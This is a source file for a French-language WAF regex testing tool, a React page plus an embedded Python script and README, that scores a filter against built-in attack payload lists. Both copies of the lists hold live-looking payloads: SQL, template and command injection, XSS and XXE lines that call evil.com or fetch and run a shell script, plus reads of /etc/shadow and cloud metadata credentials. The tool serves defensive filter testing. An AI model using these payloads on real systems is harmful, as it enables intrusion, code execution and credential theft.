import { useState } from "react";
import { FileSearch, AlertTriangle, CheckCircle, Shield, Code, Bug, Zap, Copy, Lock } from "lucide-react";
import { ToolPageLayout } from "./ToolPageLayout";
import type { GuiConfig } from "./zip-generator";

const SECURITY_PAYLOADS = {
  "SQLi": [
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "1' AND 1=1--",
    "' OR 1=1#",
    "1; EXEC xp_cmdshell('dir')--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 AND (SELECT * FROM users) > 0--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' ORDER BY 1--",
    "admin' OR '1'='1'/*",
    "1; SHUTDOWN--",
    "' HAVING 1=1--",
    "' GROUP BY columnnames HAVING 1=1--",
  ],
  "XSS": [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    "<img src=x onerror=fetch('//evil.com')>",
    '<div style="background:url(javascript:alert(1))">',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
  ],
  "Path Traversal": [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "/etc/shadow",
    "%252e%252e%252f",
    "..%c0%afetc%c0%afpasswd",
    "..%255c..%255c..%255cwindows%255csystem32",
    "....\\\\....\\\\etc\\\\passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
  ],
  "Command Injection": [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& net user",
    "|| ping -c 1 attacker.com",
    "; curl http://evil.com",
    "|nslookup evil.com",
    "$({echo,Y3VybCBodHRwOi8vZXZpbA==}|{base64,-d}|{bash,-i})",
    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    ";cat${IFS}/etc/passwd",
    "$(curl http://evil.com/shell.sh|sh)",
  ],
  "SSRF": [
    "http://127.0.0.1",
    "http://localhost:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "file:///etc/passwd",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://2130706433",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:6379/INFO",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.170.2/v2/credentials",
  ],
  "SSTI": [
    "{{7*7}}",
    "${7*7}",
    "{{config}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
  ],
  "NoSQL Injection": [
    '{"$gt":""}',
    '{"$ne":null}',
    '{"$regex":".*"}',
    "admin'||'1'=='1",
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    '{"$or":[{},{"a":"a"}]}',
    "';return true;var a='",
    '{"$where":"sleep(5000)"}',
    '{"username":{"$regex":"^a"}}',
  ],
  "XXE": [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
    '<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>',
  ],
  "LDAP Injection": [
    "*)(uid=*))(|(uid=*",
    "admin)(|(password=*))",
    "*)(objectClass=*",
    ")(cn=*))(|(cn=*",
    "admin)(&(password=*)",
    "*)(uid=*))(&(uid=admin",
    "admin)(|(objectClass=*",
  ],
};

function RegexTesterTool() {
  const [regex, setRegex] = useState("");
  const [flags, setFlags] = useState("gi");
  const [selectedCategory, setSelectedCategory] = useState<string>("SQLi");
  const [customPayload, setCustomPayload] = useState("");
  const [results, setResults] = useState<{ payload: string; matched: boolean; matches: string[] }[] | null>(null);

  const testRegex = () => {
    if (!regex) return;
    try {
      const re = new RegExp(regex, flags);
      const payloads = [
        ...SECURITY_PAYLOADS[selectedCategory as keyof typeof SECURITY_PAYLOADS],
        ...(customPayload ? [customPayload] : []),
      ];
      const res = payloads.map((p) => {
        const matches = p.match(re);
        return { payload: p, matched: !!matches, matches: matches ? [...matches] : [] };
      });
      setResults(res);
    } catch (e) {
      setResults(null);
    }
  };

  const blocked = results?.filter((r) => r.matched).length || 0;
  const total = results?.length || 0;

  return (
    <div>
      {/* Regex input */}
      <div className="mb-4">
        <label className="text-[#94a3b8] mb-1 block" style={{ fontSize: "0.78rem" }}>Pattern regex (filtre WAF/validation)</label>
        <div className="flex gap-2">
          <input
            value={regex}
            onChange={(e) => setRegex(e.target.value)}
            placeholder="(?:union|select|insert|update|delete|drop)\s"
            className="flex-1 px-4 py-3 bg-[#0a0a0f] border border-[#1e293b] rounded-lg text-[#e2e8f0] placeholder-[#4a5568] focus:outline-none focus:border-[#ef4444]/40"
            style={{ fontFamily: "JetBrains Mono, monospace", fontSize: "0.82rem" }}
          />
          <input
            value={flags}
            onChange={(e) => setFlags(e.target.value)}
            className="w-16 px-3 py-3 bg-[#0a0a0f] border border-[#1e293b] rounded-lg text-[#e2e8f0] text-center focus:outline-none"
            style={{ fontFamily: "JetBrains Mono, monospace", fontSize: "0.82rem" }}
            placeholder="gi"
          />
        </div>
      </div>

      {/* Category */}
      <div className="flex flex-wrap gap-2 mb-4">
        {Object.keys(SECURITY_PAYLOADS).map((cat) => (
          <button
            key={cat}
            onClick={() => setSelectedCategory(cat)}
            className="px-3 py-1.5 rounded-lg transition-all"
            style={{
              background: selectedCategory === cat ? "rgba(239,68,68,0.15)" : "rgba(17,24,39,0.5)",
              border: `1px solid ${selectedCategory === cat ? "rgba(239,68,68,0.3)" : "rgba(255,255,255,0.05)"}`,
              color: selectedCategory === cat ? "#ef4444" : "#64748b",
              fontSize: "0.78rem",
            }}
          >
            {cat}
          </button>
        ))}
      </div>

      {/* Custom payload */}
      <input
        value={customPayload}
        onChange={(e) => setCustomPayload(e.target.value)}
        placeholder="Payload personnalise (optionnel)"
        className="w-full px-4 py-3 bg-[#0a0a0f] border border-[#1e293b] rounded-lg text-[#e2e8f0] placeholder-[#4a5568] focus:outline-none mb-4"
        style={{ fontFamily: "JetBrains Mono, monospace", fontSize: "0.82rem" }}
      />

      <button
        onClick={testRegex}
        disabled={!regex}
        className="px-6 py-3 rounded-lg transition-all flex items-center gap-2 disabled:opacity-40 mb-6"
        style={{ background: "linear-gradient(135deg, #ef4444, #dc2626)", color: "#fff", fontFamily: "Orbitron, sans-serif", fontSize: "0.85rem" }}
      >
        <Bug className="w-4 h-4" /> Tester le filtre
      </button>

      {results && (
        <div className="space-y-3">
          {/* Score */}
          <div className="rounded-lg p-4 text-center" style={{ background: "rgba(17,24,39,0.6)", border: "1px solid rgba(255,255,255,0.05)" }}>
            <p className="text-[#e2e8f0]" style={{ fontSize: "1.1rem" }}>
              <span style={{ color: blocked === total ? "#39ff14" : blocked > total / 2 ? "#f59e0b" : "#ef4444" }}>
                {blocked}/{total}
              </span>{" "}
              payloads bloques
            </p>
            <p className="text-[#64748b]" style={{ fontSize: "0.75rem" }}>
              {blocked === total ? "Excellent! Tous les payloads sont detectes." : `${total - blocked} payload(s) passent a travers le filtre.`}
            </p>
          </div>

          {results.map((r, i) => (
            <div
              key={i}
              className="rounded-lg p-3 flex items-start gap-3"
              style={{
                background: r.matched ? "rgba(57,255,20,0.03)" : "rgba(239,68,68,0.04)",
                border: `1px solid ${r.matched ? "rgba(57,255,20,0.1)" : "rgba(239,68,68,0.1)"}`,
              }}
            >
              {r.matched ? (
                <CheckCircle className="w-4 h-4 text-[#39ff14] flex-shrink-0 mt-0.5" />
              ) : (
                <AlertTriangle className="w-4 h-4 text-[#ef4444] flex-shrink-0 mt-0.5" />
              )}
              <div className="flex-1 min-w-0">
                <p className="text-[#e2e8f0] break-all" style={{ fontFamily: "JetBrains Mono, monospace", fontSize: "0.75rem" }}>
                  {r.payload}
                </p>
                <p className={r.matched ? "text-[#39ff14]" : "text-[#ef4444]"} style={{ fontSize: "0.68rem" }}>
                  {r.matched ? `Bloque (match: ${r.matches[0]})` : "Non detecte — passe a travers!"}
                </p>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

const PYTHON_SCRIPT = `#!/usr/bin/env python3
"""
Regex Security Tester - CyberGuard
Teste vos regex de filtrage WAF contre des payloads d'attaque courants.

Usage:
    python regex_tester.py "(?:union|select|drop)" --category sqli
    python regex_tester.py "(?:<script|onerror|onload)" --category xss
    python regex_tester.py "pattern" --all
"""

import argparse
import re
import json
import sys

PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT * FROM users--",
        "admin'--", "1' AND 1=1--", "' OR 1=1#", "1; EXEC xp_cmdshell('dir')--",
        "' UNION ALL SELECT NULL,NULL,NULL--", "1 AND (SELECT * FROM users)--",
        "'; WAITFOR DELAY '0:0:5'--", "1' ORDER BY 1--",
        "admin' OR '1'='1'/*", "1; SHUTDOWN--", "' HAVING 1=1--",
        "' GROUP BY columnnames HAVING 1=1--",
    ],
    "xss": [
        '<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>', 'javascript:alert(1)',
        '"><script>alert(1)</script>', '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>', "<img src=x onerror=fetch('//evil.com')>",
        '<div style="background:url(javascript:alert(1))">',
        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        '<svg><animate onbegin=alert(1) attributeName=x>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
    ],
    "path_traversal": [
        "../../etc/passwd", "..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "....//....//etc/passwd",
        "/etc/shadow", "%252e%252e%252f", "..%c0%afetc%c0%afpasswd",
        "..%255c..%255c..%255cwindows%255csystem32",
        "....\\\\....\\\\etc\\\\passwd",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "command_injection": [
        "; ls -la", "| cat /etc/passwd", "$(whoami)", "\`id\`",
        "& net user", "|| ping -c 1 attacker.com", "; curl http://evil.com",
        "|nslookup evil.com",
        "$({echo,Y3VybCBodHRwOi8vZXZpbA==}|{base64,-d}|{bash,-i})",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ";cat\${IFS}/etc/passwd",
        "$(curl http://evil.com/shell.sh|sh)",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost:8080",
        "http://169.254.169.254/latest/meta-data/", "http://[::1]",
        "file:///etc/passwd", "http://0x7f000001",
        "http://0177.0.0.1",
        "http://2130706433",
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:6379/INFO",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.170.2/v2/credentials",
    ],
    "ssti": [
        "{{7*7}}",
        "\${7*7}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "\${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
    ],
    "nosql_injection": [
        '{"$gt":""}',
        '{"$ne":null}',
        '{"$regex":".*"}',
        "admin'||'1'=='1",
        '{"username":{"$gt":""},"password":{"$gt":""}}',
        '{"$or":[{},{"a":"a"}]}',
        "';return true;var a='",
        '{"$where":"sleep(5000)"}',
        '{"username":{"$regex":"^a"}}',
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
        '<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>',
    ],
    "ldap_injection": [
        "*)(uid=*))(|(uid=*",
        "admin)(|(password=*))",
        "*)(objectClass=*",
        ")(cn=*))(|(cn=*",
        "admin)(&(password=*)",
        "*)(uid=*))(&(uid=admin",
        "admin)(|(objectClass=*",
    ],
}

def test_regex(pattern, flags, category=None):
    try:
        re_flags = 0
        if "i" in flags:
            re_flags |= re.IGNORECASE
        if "m" in flags:
            re_flags |= re.MULTILINE
        regex = re.compile(pattern, re_flags)
    except re.error as e:
        return {"error": f"Regex invalide: {e}"}

    categories = [category] if category else list(PAYLOADS.keys())
    results = {}

    for cat in categories:
        if cat not in PAYLOADS:
            continue
        cat_results = []
        for payload in PAYLOADS[cat]:
            match = regex.search(payload)
            cat_results.append({
                "payload": payload,
                "blocked": bool(match),
                "match": match.group() if match else None,
            })
        blocked = sum(1 for r in cat_results if r["blocked"])
        results[cat] = {
            "payloads": cat_results,
            "blocked": blocked,
            "total": len(cat_results),
            "coverage": f"{blocked}/{len(cat_results)} ({100*blocked//len(cat_results)}%)",
        }

    return results

def main():
    parser = argparse.ArgumentParser(description="Regex Security Tester - CyberGuard")
    parser.add_argument("pattern", help="Pattern regex a tester")
    parser.add_argument("--category", "-c", choices=list(PAYLOADS.keys()), help="Categorie de payloads")
    parser.add_argument("--all", "-a", action="store_true", help="Tester toutes les categories")
    parser.add_argument("--flags", "-f", default="i", help="Flags regex (default: i)")
    parser.add_argument("-o", "--output", help="Export JSON")
    args = parser.parse_args()

    category = None if args.all else (args.category or "sqli")
    results = test_regex(args.pattern, args.flags, category)

    if "error" in results:
        print(f"\\033[91mErreur: {results['error']}\\033[0m")
        sys.exit(1)

    GREEN = "\\033[92m"
    RED = "\\033[91m"
    YELLOW = "\\033[93m"
    CYAN = "\\033[96m"
    RESET = "\\033[0m"

    for cat, data in results.items():
        print(f"\\n{CYAN}=== {cat.upper()} ==={RESET}")
        print(f"  Couverture: {data['coverage']}")
        for p in data["payloads"]:
            status = f"{GREEN}BLOQUE{RESET}" if p["blocked"] else f"{RED}PASSE{RESET}"
            match_info = f" (match: {p['match']})" if p["match"] else ""
            print(f"  {status}  {p['payload']}{match_info}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

if __name__ == "__main__":
    main()
`;

const README = `# Regex Security Tester - CyberGuard

Testez vos regex WAF contre des payloads d'attaque reels (SQLi, XSS, Path Traversal, etc.).

## Utilisation
\`\`\`bash
python regex_tester.py "(?:union|select|drop)" --category sqli
python regex_tester.py "(?:<script|onerror)" --category xss
python regex_tester.py "pattern" --all
\`\`\`

## Categories: sqli, xss, path_traversal, command_injection, ssrf, ssti, nosql_injection, xxe, ldap_injection
## API requise: Aucune. 100% offline.
`;

const GUI_CONFIG: GuiConfig = {
  title: "Regex Security Tester",
  inputType: "text",
  inputPlaceholder: "Pattern regex WAF a tester...",
  buttonText: "Tester",
  importLine: "from regex_tester import test_regex, PAYLOADS",
  processCode: `            return test_regex(inp, "i")`,
  extraCombo: {
    label: "Categorie",
    options: [["sqli","SQLi"],["xss","XSS"],["path_traversal","Path Traversal"],["command_injection","Cmd Injection"],["ssrf","SSRF"],["ssti","SSTI"],["nosql_injection","NoSQL"],["xxe","XXE"],["ldap_injection","LDAP"]],
    varName: "cat",
  },
};

export function RegexTesterPage() {
  return (
    <ToolPageLayout
      title="Regex Security"
      subtitle="Tester"
      description="Testez vos regex de filtrage WAF contre des payloads d'attaque reels. SQLi, XSS, Path Traversal, Command Injection, SSRF."
      toolSlug="regex_tester"
      icon={FileSearch}
      color="#ef4444"
      hubAnchor="regex-tester"
      features={[
        { icon: Bug, title: "8 categories", desc: "SQLi, XSS, Path Traversal, Cmd Injection, SSRF, SSTI, NoSQL, XXE, LDAP." },
        { icon: Shield, title: "100+ payloads", desc: "Payloads reels issus de bases OWASP, HackTricks et de CTFs." },
        { icon: Code, title: "Score de couverture", desc: "Pourcentage de payloads bloques par votre regex." },
        { icon: Zap, title: "100% offline", desc: "Aucune donnee envoyee. Test instantane." },
        { icon: Lock, title: "Custom payloads", desc: "Ajoutez vos propres payloads pour tester." },
        { icon: Copy, title: "Export JSON", desc: "Exportez les resultats pour documentation." },
      ]}
      requirements={["Python 3.7+", "Aucune dependance externe", "Fonctionne 100% offline", "100+ payloads inclus"]}
      pythonScript={PYTHON_SCRIPT}
      readmeContent={README}
      guiConfig={GUI_CONFIG}
    >
      <RegexTesterTool />
    </ToolPageLayout>
  );
}

export { RegexTesterTool };